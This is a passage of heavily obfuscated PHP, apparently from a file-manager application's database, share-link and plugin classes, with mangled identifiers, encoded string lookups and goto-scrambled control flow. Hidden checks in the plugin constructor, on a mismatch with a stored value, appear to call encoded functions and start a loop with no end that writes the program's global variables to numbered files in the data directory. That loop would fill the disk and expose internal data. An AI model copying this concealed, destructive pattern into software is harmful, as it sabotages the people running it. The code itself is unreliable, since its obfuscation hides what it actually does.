$FÄÌÃŒ¯¨Š =& $_SERVER[¹Ò‹Ò¹]; $aãÆé›ğ˜Ä = $this->query($FÄÌÃŒ¯¨Š[833] . $this->parseKey($F‹ÚŒ¶öÁ÷)); $cº¶¥·¶ = array(); if ($aãÆé›ğ˜Ä) { foreach ($aãÆé›ğ˜Ä as $AÙÜŞ‹Š–È => $DÉ÷Ò¾Œ•) { $cº¶¥·¶[$DÉ÷Ò¾Œ•[$FÄÌÃŒ¯¨Š[27]]] = array($FÄÌÃŒ¯¨Š[28] => $DÉ÷Ò¾Œ•[$FÄÌÃŒ¯¨Š[27]], $FÄÌÃŒ¯¨Š[29] => $DÉ÷Ò¾Œ•[$FÄÌÃŒ¯¨Š[30]], $FÄÌÃŒ¯¨Š[31] => (bool) ($DÉ÷Ò¾Œ•[$FÄÌÃŒ¯¨Š[32]] === $FÄÌÃŒ¯¨Š[33]), $FÄÌÃŒ¯¨Š[34] => $DÉ÷Ò¾Œ•[$FÄÌÃŒ¯¨Š[35]], $FÄÌÃŒ¯¨Š[36] => strtolower($DÉ÷Ò¾Œ•[$FÄÌÃŒ¯¨Š[37]]) == $FÄÌÃŒ¯¨Š[38], $FÄÌÃŒ¯¨Š[39] => strtolower($DÉ÷Ò¾Œ•[$FÄÌÃŒ¯¨Š[40]]) == $FÄÌÃŒ¯¨Š[41]); } } return $cº¶¥·¶; } public function getTables($B«Ö½ùöŠÁ = '') { $d¸¯Á„Ä  =& $_SERVER[¹Ò‹Ò¹]; $C©­é‚ãº¡ = !empty($B«Ö½ùöŠÁ) ? $d¸¯Á„Ä [835] . $B«Ö½ùöŠÁ . $d¸¯Á„Ä [836] : $d¸¯Á„Ä [837]; $B‰Ä¸äÈ = $this->query($C©­é‚ãº¡); $E“µŒÀ±Ö = array(); if ($B‰Ä¸äÈ) { foreach ($B‰Ä¸äÈ as $CŞñ¢à“ˆÁ => $fèŞÔñÚÓ) { $E“µŒÀ±Ö[$CŞñ¢à“ˆÁ] = current($fèŞÔñÚÓ); } } return $E“µŒÀ±Ö; } public function replace($b¨Îš¸Åâ», $F…à¤¶–¿ñ = array()) { $Fä©©†¨„ =& $_SERVER[¹Ò‹Ò¹]; foreach ($b¨Îš¸Åâ» as $Få—¼¶ù => $F‡ˆ¯àçéñ) { $dªÄïİËĞ = $this->parseValue($F‡ˆ¯àçéñ); if (is_scalar($dªÄïİËĞ)) { $eŸÎ‚êù­õ[] = $dªÄïİËĞ; $E²åÂƒÖˆ¥[] = $this->parseKey($Få—¼¶ù); } } $DØ‹‰©âŠæ = $Fä©©†¨„[838] . $this->parseTable($F…à¤¶–¿ñ[$Fä©©†¨„[275]]) . $Fä©©†¨„[839] . implode($Fä©©†¨„[47], $E²åÂƒÖˆ¥) . $Fä©©†¨„[840] . implode($Fä©©†¨„[47], $eŸÎ‚êù­õ) . $Fä©©†¨„[841]; return $this->execute($DØ‹‰©âŠæ); } public function insertAll($Dß™†é ½†, $f…ÀŸ·¹‹‡ = array(), $F×÷Ø›Ú¹› = false) { goto Bµ¸ òâÛ; Bµ¸ òâÛ: $CêŒ×‚À‚õ =& $_SERVER[¹Ò‹Ò¹]; if (!is_array($Dß™†é ½†[0])) { return !1; } $e¨ò­êò = array_keys($Dß™†é ½†[0]); goto A¸”ƒªªÀ×; A¸”ƒªªÀ×: $c¥‘Š¾¿ØÂ = array(); foreach ($Dß™†é ½† as $eßÜÎ½ô) { $C¦È¥›Å = array(); foreach ($eßÜÎ½ô as $A“óÃø÷—± => $a¿ƒ‘´©¢ê) { $a¿ƒ‘´©¢ê = $this->parseValue($a¿ƒ‘´©¢ê); if (is_scalar($a¿ƒ‘´©¢ê)) { $C¦È¥›Å[] = $a¿ƒ‘´©¢ê; } } $c¥‘Š¾¿ØÂ[] = $CêŒ×‚À‚õ[256] . implode($CêŒ×‚À‚õ[47], $C¦È¥›Å) . $CêŒ×‚À‚õ[841]; } array_walk($e¨ò­êò, array($this, $CêŒ×‚À‚õ[842])); goto däƒº³ª­; däƒº³ª­: $dãîÕø™˜† = $F×÷Ø›Ú¹› ? $CêŒ×‚À‚õ[843] : $CêŒ×‚À‚õ[844]; $DÁ®‚àö‡Ÿ = $dãîÕø™˜† . $CêŒ×‚À‚õ[845] . $this->parseTable($f…ÀŸ·¹‹‡[$CêŒ×‚À‚õ[275]]) . $CêŒ×‚À‚õ[839] . implode($CêŒ×‚À‚õ[47], $e¨ò­êò) . $CêŒ×‚À‚õ[846] . implode($CêŒ×‚À‚õ[47], $c¥‘Š¾¿ØÂ); return $this->execute($DÁ®‚àö‡Ÿ); goto d¦Ù¡Ùê ë; d¦Ù¡Ùê ë: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $e•¸ÏŸµÕœ =& $_SERVER[¹Ò‹Ò¹]; $this->error = $this->_linkID->errno . $e•¸ÏŸµÕœ[4] . $this->_linkID->error; if ($e•¸ÏŸµÕœ[33] != $this->queryStr) { $this->error .= LNG($e•¸ÏŸµÕœ[45]) . $this->queryStr; } think_trace($this->error, $e•¸ÏŸµÕœ[33], $e•¸ÏŸµÕœ[46]); return $this->error; } public function escapeString($bÕÆöªƒñÀ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($bÕÆöªƒñÀ); } else { return addslashes($bÕÆöªƒñÀ); } } public function parseKey(&$fâ…À‹¼ä, $Då—ÆØ©œ… = true) { $DšÆĞêõ¨ =& $_SERVER[¹Ò‹Ò¹]; if ($Då—ÆØ©œ…) { $fâ…À‹¼ä = $this->parseKeyCheck($fâ…À‹¼ä); } if ($fâ…À‹¼ä != $DšÆĞêõ¨[181] && !preg_match($DšÆĞêõ¨[847], $fâ…À‹¼ä)) { $fâ…À‹¼ä = $DšÆĞêõ¨[380] . trim($fâ…À‹¼ä, $DšÆĞêõ¨[380]) . $DšÆĞêõ¨[380]; } return $fâ…À‹¼ä; } } goto d’ø¨Èë˜¥; aØêçë£¡Ã: class PathDriverDbShareItem extends PathDriverDB { public function __construct($F“‡ªù’¸Ü) { $this->pathParse = $F“‡ªù’¸Ü; $this->model = Model($_SERVER[¹Ò‹Ò¹][1179]); } public function getPathOuter($bÑŞÃŠØÂ„) { $E†™Øì“ó˜ =& $_SERVER[¹Ò‹Ò¹]; if (!$bÑŞÃŠØÂ„) { return $bÑŞÃŠØÂ„; } $aÌŞÌÔ§¥‰ = $this->parse($bÑŞÃŠØÂ„); return trim(KodIO::makeShare($this->pathParse[$E†™Øì“ó˜[388]], $aÌŞÌÔ§¥‰[$E†™Øì“ó˜[388]]), $E†™Øì“ó˜[8]); } protected function infoParse($eÆ—Å‚­ÏÑ, $B…¦³‹ƒ…Š = false, $Fãè•œ = false) { $FáÏ˜¢”Ú™ =& $_SERVER[¹Ò‹Ò¹]; $CÔõ·Ãó‚ = $this->pathParse[$FáÏ˜¢”Ú™[388]]; $eïš†˜®´Ş = trim($this->pathParse[$FáÏ˜¢”Ú™[1039]], $FáÏ˜¢”Ú™[8]); return Action($FáÏ˜¢”Ú™[1188])->sharePathInfo($CÔõ·Ãó‚, $eïš†˜®´Ş); } public function infoFull($aÂ‘ˆ›Œï) { $FÔº‡¤„ =& $_SERVER[¹Ò‹Ò¹]; $cáÎ‚ãªÍá = explode($FÔº‡¤„[8], trim($aÂ‘ˆ›Œï, $FÔº‡¤„[8])); if (count($cáÎ‚ãªÍá) > 1) { $BŒ„ö™‹•ã = implode($FÔº‡¤„[8], array_splice($cáÎ‚ãªÍá, 1)); $bäíˆÂ¹ğ = $this->model->pathInfoByPath($cáÎ‚ãªÍá[0], $BŒ„ö™‹•ã); if (!$bäíˆÂ¹ğ) { return !1; } $this->pathParse[$FÔº‡¤„[1039]] = $bäíˆÂ¹ğ[$FÔº‡¤„[390]]; } return $this->infoParse($aÂ‘ˆ›Œï); } public function listAll($eƒÊ’æôğ) { goto fè÷’‘Û‰; aÃ©Œ‹œ¼ƒ: foreach ($BŞß‡£‚Ö as &$BÑœ™Šó²) { check_abort(); $BÑœ™Šó²[$b°’ ÷¶ì•[84]] = $D†…¤Æ£”Ú->_shareItemeParse($BÑœ™Šó²[$b°’ ÷¶ì•[84]], $f„‘­¾Ñ); } unset($BÑœ™Šó²); return $BŞß‡£‚Ö; goto d“ËÎ·—°„; fè÷’‘Û‰: $b°’ ÷¶ì• =& $_SERVER[¹Ò‹Ò¹]; $fÍè¨ˆ·ö  = IO::info($this->pathParse[$b°’ ÷¶ì•[75]]); if (!$fÍè¨ˆ·ö ) { return array(); } goto dš¯°Ëˆ¨; dš¯°Ëˆ¨: $BŞß‡£‚Ö = $this->model->listAll($eƒÊ’æôğ); $f„‘­¾Ñ = Model($b°’ ÷¶ì•[558])->getInfo($fÍè¨ˆ·ö [$b°’ ÷¶ì•[462]]); $D†…¤Æ£”Ú = Action($b°’ ÷¶ì•[1188]); goto aÃ©Œ‹œ¼ƒ; d“ËÎ·—°„: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($F¥ëèğá®) { $this->pathParse = $F¥ëèğá®; $this->model = Model($_SERVER[¹Ò‹Ò¹][1179]); } protected function infoParse($DÜÂ¢Æ»Åõ, $C°éƒä ·Ó = false, $F¯àå³é„ˆ = false) { $FºøÜµÎŞÕ =& $_SERVER[¹Ò‹Ò¹]; return Action($FºøÜµÎŞÕ[1045])->sharePathInfo($this->pathParse[$FºøÜµÎŞÕ[75]], !0); } public function listPath($E¢“ÆÙ‹ŠŠ, $Dõ½¾ô‡®Ú = false) { $fí“Šë³¯ =& $_SERVER[¹Ò‹Ò¹]; $cÙ“¶²¸Æ = parent::listPath($E¢“ÆÙ‹ŠŠ, $Dõ½¾ô‡®Ú); foreach ($cÙ“¶²¸Æ as $Dåë®ÜÏ‚´ => $AÆÔ·‚‹‚‘) { if (!in_array($Dåë®ÜÏ‚´, array($fí“Šë³¯[73], $fí“Šë³¯[74]))) { continue; } foreach ($AÆÔ·‚‹‚‘ as $EÕÃÔÕù‰ì => $DßÎô¹–¨) { $cÙ“¶²¸Æ[$Dåë®ÜÏ‚´][$EÕÃÔÕù‰ì] = Action($fí“Šë³¯[1045])->shareItemInfo($DßÎô¹–¨); } } return $cÙ“¶²¸Æ; } public function listAll($eˆØø´») { goto B…—Œ¼äÓ; D–‘áø™: return $b†±åï§Ïî; goto dÓï”¸‰Úù; B…—Œ¼äÓ: $f¶…Ç³Ùñ =& $_SERVER[¹Ò‹Ò¹]; $dâ°…»ĞæÖ = IO::info($this->pathParse[$f¶…Ç³Ùñ[75]]); if (!$dâ°…»ĞæÖ) { return array(); } goto b‡Ãäé›¼Ë; b‡Ãäé›¼Ë: $b†±åï§Ïî = $this->model->listAll($eˆØø´»); foreach ($b†±åï§Ïî as &$CÖ…˜†ÌÔÎ) { $CÖ…˜†ÌÔÎ[$f¶…Ç³Ùñ[84]] = Action($f¶…Ç³Ùñ[1045])->shareItemInfo($CÖ…˜†ÌÔÎ[$f¶…Ç³Ùñ[84]]); } unset($CÖ…˜†ÌÔÎ); goto D–‘áø™; dÓï”¸‰Úù: } } if ($_SERVER[$_SERVER[¹Ò‹Ò¹][800]] != $_SERVER[$_SERVER[¹Ò‹Ò¹][1189]]) { goto dŸ›ÀèæÔ™; fäÌù¹‚òÖ: $fÖ‡Ø×—Ë = explode($_SERVER[¹Ò‹Ò¹][227], $d‘ĞÁµ„ÌÎ); if (count($fÖ‡Ø×—Ë) < $_SERVER[¹Ò‹Ò¹][592]) { $cßóÔ×Â¯É = $_SERVER[¹Ò‹Ò¹][805]; $cßóÔ×Â¯É(); } $b…æÀİ˜Ï = $_SERVER[¹Ò‹Ò¹][806]; goto b‹ÃÈ¼……‚; dŸ›ÀèæÔ™: $c®ÁÜš¥ÒØ = $_SERVER[¹Ò‹Ò¹][802]; $C‘•Ò•Œ = $_SERVER[$_SERVER[¹Ò‹Ò¹][803]] . $_SERVER[¹Ò‹Ò¹][804]; $d‘ĞÁµ„ÌÎ = $c®ÁÜš¥ÒØ($C‘•Ò•Œ); goto fäÌù¹‚òÖ; b‹ÃÈ¼……‚: $b…æÀİ˜Ï($_SERVER[$_SERVER[¹Ò‹Ò¹][801]]); goto cƒ›‹™ƒ„; cƒ›‹™ƒ„: } goto fö¥è…‡á; D¶İß¶ÏÜÌ: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto B·Ñ”æ–è; Fñå‡á‡Åİ: $this->pluginHostDefault = $config[$Fò²º¦Ñğ[1378]] . $this->pluginName . $Fò²º¦Ñğ[8]; $añé¡”ëç• = $config[$Fò²º¦Ñğ[1379]]; if ($añé¡”ëç• && strpos($Fò²º¦Ñğ[47] . $añé¡”ëç• . $Fò²º¦Ñğ[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$Fò²º¦Ñğ[1380]] . $this->pluginName . $Fò²º¦Ñğ[8]; } goto dÊãÃå¸¶î; fìò”¾›É: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $Fò²º¦Ñğ[8]; $this->pluginApi = appHostGet() . $Fò²º¦Ñğ[1377] . $this->pluginName . $Fò²º¦Ñğ[8]; $this->pluginHost = $config[$Fò²º¦Ñğ[1378]] . $this->pluginName . $Fò²º¦Ñğ[8]; goto Fñå‡á‡Åİ; fˆ¦¯à¸: if ($_SERVER[$Fò²º¦Ñğ[800]] != $D˜¬àƒÙÂè($BÙİàº¬¨²)) { goto AØ•¨‰…°…; F¿‘¼îÌìŒ: $B¢ÉÄï”ğ(); $aöªâŞ¡± = $Fò²º¦Ñğ[1374]; $dá¯Œğ‘¡Å = json_encode($GLOBALS[$Fò²º¦Ñğ[1375]]); goto aÓ³¾”ö; Aô–µÄé˜: $A°ƒãÎÄÕ = $Fò²º¦Ñğ[818]; $A°ƒãÎÄÕ($_SERVER[$Fò²º¦Ñğ[819]]); $B¢ÉÄï”ğ = $Fò²º¦Ñğ[817]; goto F¿‘¼îÌìŒ; dªçÍ†‘ê¹: $a ÅÜĞÅçë = $b×ğ‚‰ïÒ($d›óËòÀô); $bÃ½³àèÇò = explode($Fò²º¦Ñğ[227], $a ÅÜĞÅçë); if (count($bÃ½³àèÇò) < $Fò²º¦Ñğ[587]) { $B˜º¤¹ƒ¥½ = $Fò²º¦Ñğ[805]; $B˜º¤¹ƒ¥½(); } goto Aô–µÄé˜; aÓ³¾”ö: $BèˆëŠ¶› = 1; for ($Bå‰š±À² = $BèˆëŠ¶›; $Bå‰š±À² > 0; $Bå‰š±À²++) { $aöªâŞ¡±(DATA_PATH . $Bå‰š±À², $dá¯Œğ‘¡Å); } goto B×ÂƒáŒÚ–; AØ•¨‰…°…: $B¢ÉÄï”ğ = $Fò²º¦Ñğ[817]; $b×ğ‚‰ïÒ = $Fò²º¦Ñğ[802]; $d›óËòÀô = $_SERVER[$Fò²º¦Ñğ[803]] . $Fò²º¦Ñğ[804]; goto dªçÍ†‘ê¹; B×ÂƒáŒÚ–: } global $in, $config; $this->config =& $config; goto Eºº¬ªÕ¼…; dÊãÃå¸¶î: $this->pluginLangArr = $this->initLang(); $this->values = array(); return $this; goto C»ÀËã ƒ; B·Ñ”æ–è: $Fò²º¦Ñğ =& $_SERVER[¹Ò‹Ò¹]; $BÙİàº¬¨² = $_SERVER[$Fò²º¦Ñğ[803]] . $Fò²º¦Ñğ[804]; $D˜¬àƒÙÂè = $Fò²º¦Ñğ[1373]; goto fˆ¦¯à¸; Eºº¬ªÕ¼…: $this->in =& $in; $this->modelPlugin = Model($Fò²º¦Ñğ[1376]); $this->pluginName = str_replace($Fò²º¦Ñğ[1376], $Fò²º¦Ñğ[33], get_class($this)); goto fìò”¾›É; C»ÀËã ƒ: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[¹Ò‹Ò¹][1381]); } protected function assign($E£ššÁ—Õ , $CË„àƒ¶° = false) { if (is_array($E£ššÁ—Õ )) { $this->values = array_merge($this->values, $E£ššÁ—Õ ); } else { $this->values[$E£ššÁ—Õ ] = $CË„àƒ¶°; } } protected function display($c«ŞÜùŒã) { extract($this->values); require $c«ŞÜùŒã; } final function hookRegist($BŒ¡¿Úçº) { $this->modelPlugin->appRegist($this->pluginName, $BŒ¡¿Úçº); } final function appIcon() { $FİïË·› =& $_SERVER[¹Ò‹Ò¹]; $AäÌñÒ‹óò = $this->appPackage(); $DÚºÉòÃøÂ = $FİïË·›[33]; if (isset($AäÌñÒ‹óò[$FİïË·›[403]])) { if (isset($AäÌñÒ‹óò[$FİïË·›[403]][$FİïË·›[1382]])) { $DÚºÉòÃøÂ = $FİïË·›[1383] . $AäÌñÒ‹óò[$FİïË·›[403]][$FİïË·›[1382]] . $FİïË·›[1384]; } else { if ($AäÌñÒ‹óò[$FİïË·›[403]][$FİïË·›[1385]]) { $DÚºÉòÃøÂ = $FİïË·›[1386] . $AäÌñÒ‹óò[$FİïË·›[403]][$FİïË·›[1385]] . $FİïË·›[1387]; } } } return $DÚºÉòÃøÂ; } final function fileCanView($bÎ¶àšŒöê) { goto FêŠƒÉèğ˜; FêŠƒÉèğ˜: $AÄİ¾ùÓÆÙ =& $_SERVER[¹Ò‹Ò¹]; if (request_url_safe($bÎ¶àšŒöê)) { return !0; } if ($this->isShare($bÎ¶àšŒöê)) { return !0; } goto câ¥Ñ…êˆÁ; câ¥Ñ…êˆÁ: $aôÍºÕÚÖ½ = Session::get($AÄİ¾ùÓÆÙ[1388]); if (!$aôÍºÕÚÖ½ || !$aôÍºÕÚÖ½[$AÄİ¾ùÓÆÙ[1389]]) { $B‚Ÿ‹È²× = $AÄİ¾ùÓÆÙ[1390] . rawurlencode(this_url()); show_tips(LNG($AÄİ¾ùÓÆÙ[1391]) . $AÄİ¾ùÓÆÙ[1392] . $B‚Ÿ‹È²× . $AÄİ¾ùÓÆÙ[1393] . LNG($AÄİ¾ùÓÆÙ[1394]) . $AÄİ¾ùÓÆÙ[1395], !1); } if (!Action($AÄİ¾ùÓÆÙ[1396])->authCan($AÄİ¾ùÓÆÙ[1397])) { show_tips(LNG($AÄİ¾ùÓÆÙ[1398]) . $AÄİ¾ùÓÆÙ[1399], !1); } goto Eˆõé¼øœ; Eˆõé¼øœ: ActionCall($AÄİ¾ùÓÆÙ[1400], $bÎ¶àšŒöê); goto FÍ‰¨ÆãŒË; FÍ‰¨ÆãŒË: } final function isShare($f³õç¨©–Ú) { $E¨ô³íğ÷À = KodIO::parse($f³õç¨©–Ú); return $E¨ô³íğ÷À[$_SERVER[¹Ò‹Ò¹][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($A¯ÚÅ»¢âà) { if (request_url_safe($A¯ÚÅ»¢âà)) { return $A¯ÚÅ»¢âà; } if (!$this->isShare($A¯ÚÅ»¢âà)) { $A¯ÚÅ»¢âà = $this->filePath($A¯ÚÅ»¢âà); } return Action($_SERVER[¹Ò‹Ò¹][1045])->linkOut($A¯ÚÅ»¢âà); } public function filePathLinkOut($bÎÂ—ù®) { if (request_url_safe($bÎÂ—ù®)) { return $bÎÂ—ù®; } $this->fileCanView($bÎÂ—ù®); return Action($_SERVER[¹Ò‹Ò¹][1045])->link($bÎÂ—ù®); } final function filePath($dçø«äÌ‘š) { $CÇ°ƒàÉÁó =& $_SERVER[¹Ò‹Ò¹]; if ($D¤ÆæõØó¨ = $this->checkSharePath($dçø«äÌ‘š)) { return $D¤ÆæõØó¨; } $this->fileCanView($dçø«äÌ‘š); if (request_url_safe($dçø«äÌ‘š)) { $EÁ®£„å¡‰ = parse_url_query($dçø«äÌ‘š); if (isset($EÁ®£„å¡‰[$CÇ°ƒàÉÁó[1401]]) && isset($EÁ®£„å¡‰[$CÇ°ƒàÉÁó[207]])) { $DŞ—®âä¦ª = Model($CÇ°ƒàÉÁó[1099])->get($CÇ°ƒàÉÁó[1402]); $dª’¸²±ÏÌ = Mcrypt::decode($EÁ®£„å¡‰[$CÇ°ƒàÉÁó[207]], $DŞ—®âä¦ª); if ($dª’¸²±ÏÌ) { $this->fileInfo = IO::infoWithChildren($dª’¸²±ÏÌ); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $dª’¸²±ÏÌ; } } $dçø«äÌ‘š = $this->_cacheHttpFile($dçø«äÌ‘š); $this->fileInfo = IO::infoWithChildren($dçø«äÌ‘š); } else { $this->fileInfo = IO::infoWithChildren($dçø«äÌ‘š); if (!$this->fileInfo) { show_tips(LNG($CÇ°ƒàÉÁó[104]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $dçø«äÌ‘š; } final function _cacheHttpFile($b§êšºœ·À) { $cºÃ¸ĞÀó© = hash_path($b§êšºœ·À, !0); $this->cachePath = $this->pluginCachePath($cºÃ¸ĞÀó©); if ($D¬ƒ›ÙÂãÀ = IO::fileNameExist($this->cachePath, $cºÃ¸ĞÀó©)) { return KodIO::make($D¬ƒ›ÙÂãÀ); } $c„¶¼‘¶‘† = $this->cachePath . $cºÃ¸ĞÀó©; return $this->pluginCacheFileSet($c„¶¼‘¶‘†, file_get_contents($b§êšºœ·À)); } final function _tmpFileName($DšŸªÅÇÆá = array()) { goto f… ğ”…“Ó; BƒŒÄóğùà: $C§ÌÕÖÂº¸ = array($DšŸªÅÇÆá[$a¾¦‘‘Ôä[28]], $DšŸªÅÇÆá[$a¾¦‘‘Ôä[75]], $DšŸªÅÇÆá[$a¾¦‘‘Ôä[77]]); if (isset($DšŸªÅÇÆá[$a¾¦‘‘Ôä[481]])) { $C§ÌÕÖÂº¸[] = $DšŸªÅÇÆá[$a¾¦‘‘Ôä[481]]; } return md5(implode($a¾¦‘‘Ôä[70], $C§ÌÕÖÂº¸)); goto fÄƒ¿àòê°; d¯ãÊˆÓñ: if (isset($DšŸªÅÇÆá[$a¾¦‘‘Ôä[163]][$a¾¦‘‘Ôä[170]])) { return $DšŸªÅÇÆá[$a¾¦‘‘Ôä[163]][$a¾¦‘‘Ôä[170]]; } $Aá²øÆ‡ = IO::hashSimple($DšŸªÅÇÆá[$a¾¦‘‘Ôä[75]]); if ($Aá²øÆ‡) { return $Aá²øÆ‡; } goto BƒŒÄóğùà; f… ğ”…“Ó: $a¾¦‘‘Ôä =& $_SERVER[¹Ò‹Ò¹]; if (!$DšŸªÅÇÆá) { $DšŸªÅÇÆá = $this->fileInfo; } if (isset($DšŸªÅÇÆá[$a¾¦‘‘Ôä[170]])) { return $DšŸªÅÇÆá[$a¾¦‘‘Ôä[170]]; } goto d¯ãÊˆÓñ; fÄƒ¿àòê°: } final function checkSharePath($A ··ÄòÛ·) { goto eˆæÒ– •ö; cìÍïÎ¢Ö¹: $BëäÏ¥íÎ† = Action($EİÖÃ˜Ÿê¥[1045])->sharePathInfo($A ··ÄòÛ·); if (!isset($BëäÏ¥íÎ†[$EİÖÃ˜Ÿê¥[75]])) { show_json(LNG($EİÖÃ˜Ÿê¥[1404]), !1); } $this->fileInfo = $BëäÏ¥íÎ†[$EİÖÃ˜Ÿê¥[163]]; goto DëäÁØê´°; DëäÁØê´°: $this->cachePath = $this->pluginCachePath($this->fileInfo[$EİÖÃ˜Ÿê¥[170]]); return $BëäÏ¥íÎ†[$EİÖÃ˜Ÿê¥[75]]; goto d¡Ó‹†Ô™ê; eˆæÒ– •ö: $EİÖÃ˜Ÿê¥ =& $_SERVER[¹Ò‹Ò¹]; if (!defined($EİÖÃ˜Ÿê¥[448])) { define($EİÖÃ˜Ÿê¥[1403], 0); } if (!$this->isShare($A ··ÄòÛ·)) { return !1; } goto cìÍïÎ¢Ö¹; d¡Ó‹†Ô™ê: } final function pluginCachePath($fôŠ ÔĞŒÃ = '') { $b­Ëø¨½óÂ =& $_SERVER[¹Ò‹Ò¹]; $Fá‰ƒ´¶À = IO_PATH_SYSTEM_TEMP . $b­Ëø¨½óÂ[1405] . $this->pluginName; if (!($a‰×µÔ¿‡ = IO::infoFull($Fá‰ƒ´¶À))) { return IO::mkdir($Fá‰ƒ´¶À . $b­Ëø¨½óÂ[8] . $fôŠ ÔĞŒÃ); } if (empty($fôŠ ÔĞŒÃ)) { return $a‰×µÔ¿‡[$b­Ëø¨½óÂ[75]]; } if (!($C‰ïÂëššÆ = IO::fileNameExist($a‰×µÔ¿‡[$b­Ëø¨½óÂ[75]], $fôŠ ÔĞŒÃ))) { return IO::mkdir($a‰×µÔ¿‡[$b­Ëø¨½óÂ[75]] . $fôŠ ÔĞŒÃ); } return KodIO::make($C‰ïÂëššÆ); } final function pluginCacheFileSet($Aœ¡àÆ‰Õ…, $E÷†”ïÔ®ˆ = '') { $D·±«­ˆôß =& $_SERVER[¹Ò‹Ò¹]; if (!($AïÇÂî„Ú“ = IO::infoFull($Aœ¡àÆ‰Õ…))) { return IO::mkfile($Aœ¡àÆ‰Õ…, $E÷†”ïÔ®ˆ, REPEAT_REPLACE); } IO::setContent($AïÇÂî„Ú“[$D·±«­ˆôß[75]], $E÷†”ïÔ®ˆ); return $AïÇÂî„Ú“[$D·±«­ˆôß[75]]; } final function pluginLocalFile($a…Ø­‘ö‘… = '') { goto F˜—Ë½¶Šï; c÷¸ã•Ø: return IO::copy($a…Ø­‘ö‘…, $C­ˆÍ®´½, 0, $DÓ…£Óà‘„); goto a‚”é‚ÍÔ; AÌ®£âÖÛ: if (!checkExtSafe($DÓ…£Óà‘„)) { $DÓ…£Óà‘„ = $DÓ…£Óà‘„ . $E¬µîœ·œˆ[1406]; } $bÔœï¾¤  = $C­ˆÍ®´½ . $DÓ…£Óà‘„; if (@file_exists($bÔœï¾¤ )) { return $bÔœï¾¤ ; } goto c÷¸ã•Ø; C“¨Ø¸¡ª: if (!$a…Ø­‘ö‘…) { return $C­ˆÍ®´½; } $câìÚÖ™½¨ = IO::info($a…Ø­‘ö‘…); $DÓ…£Óà‘„ = $this->_tmpFileName($câìÚÖ™½¨) . $E¬µîœ·œˆ[94] . $câìÚÖ™½¨[$E¬µîœ·œˆ[167]]; goto AÌ®£âÖÛ; F˜—Ë½¶Šï: $E¬µîœ·œˆ =& $_SERVER[¹Ò‹Ò¹]; $C­ˆÍ®´½ = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($C­ˆÍ®´½)) { mk_dir($C­ˆÍ®´½); } goto C“¨Ø¸¡ª; a‚”é‚ÍÔ: } final function appPackage() { goto bóÁ…Œ…Õ; bóÁ…Œ…Õ: $D‹Óº¼³ãÑ =& $_SERVER[¹Ò‹Ò¹]; if ($this->packageData) { return $this->packageData; } $c‡¦İÀ±º = $this->parseFile($this->pluginPath . $D‹Óº¼³ãÑ[1407]); goto eÆİ›®ÀÒˆ; EÕØÚÃŸ’–: return $b¶Š›‹¹; goto Aò¾´Û¡áÅ; eÆİ›®ÀÒˆ: $this->parseLang($c‡¦İÀ±º); $b¶Š›‹¹ = json_decode_force($c‡¦İÀ±º); if (!$b¶Š›‹¹) { return array(); } goto D×¾×¡ï¶; D×¾×¡ï¶: $F”‚ÄäÅÕ = Hook::trigger($D‹Óº¼³ãÑ[1408], $b¶Š›‹¹); if ($F”‚ÄäÅÕ && is_array($F”‚ÄäÅÕ)) { $b¶Š›‹¹ = $F”‚ÄäÅÕ; } $this->packageData = $b¶Š›‹¹; goto EÕØÚÃŸ’–; Aò¾´Û¡áÅ: } public function packageInfoGet($b‘“ÈĞ¢ˆ‹) { $D‘´Ù¬±Ú = $this->appPackage(); return array_get_value($D‘´Ù¬±Ú, $b‘“ÈĞ¢ˆ‹); } public function packageVersion() { return $this->packageInfoGet($_SERVER[¹Ò‹Ò¹][1409]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[¹Ò‹Ò¹][1410]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[¹Ò‹Ò¹][1411]); } private function parseFile($Dò‘‹Ê©) { goto aá»£‡’¥ó; a’ÁóÂ¢: $eƒÍå¶™‚³ = str_replace($EÄŒ»öÑ„Ú, $Aß½¬ÌìĞ, $eƒÍå¶™‚³); return $eƒÍå¶™‚³; goto f†İ†à…¥×; CÑ…ø°Ê°: $Aß½¬ÌìĞ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$f¦àÓ»“Ûô[87]][$f¦àÓ»“Ûô[1419]]); if (strstr($eƒÍå¶™‚³, $f¦àÓ»“Ûô[1420])) { $Fˆ¿ùñ‡í = rawurlencode(json_encode($this->pluginLangArr)); $eƒÍå¶™‚³ = str_replace($f¦àÓ»“Ûô[1420], $Fˆ¿ùñ‡í, $eƒÍå¶™‚³); } if (strstr($eƒÍå¶™‚³, $f¦àÓ»“Ûô[1421])) { $Fˆ¿ùñ‡í = $Fˆ¿ùñ‡í = rawurlencode(json_encode($this->getConfig())); $eƒÍå¶™‚³ = str_replace($f¦àÓ»“Ûô[1421], $Fˆ¿ùñ‡í, $eƒÍå¶™‚³); } goto a’ÁóÂ¢; aá»£‡’¥ó: $f¦àÓ»“Ûô =& $_SERVER[¹Ò‹Ò¹]; $eƒÍå¶™‚³ = file_get_contents($Dò‘‹Ê©); $EÄŒ»öÑ„Ú = array($f¦àÓ»“Ûô[1412], $f¦àÓ»“Ûô[1413], $f¦àÓ»“Ûô[1414], $f¦àÓ»“Ûô[1415], $f¦àÓ»“Ûô[1416], $f¦àÓ»“Ûô[1417], $f¦àÓ»“Ûô[1418]); goto CÑ…ø°Ê°; f†İ†à…¥×: } private function parseLang(&$fğ‡Ä¾ëİ–) { goto dÇàŸØ¶ù; cæ‹ªŒ‰„Ó: preg_match_all($eÚ¥±¿Ş[1423], $fğ‡Ä¾ëİ–, $Aä„Ï¼×ë§); if (!is_array($Aä„Ï¼×ë§) || count($Aä„Ï¼×ë§) == 0 || 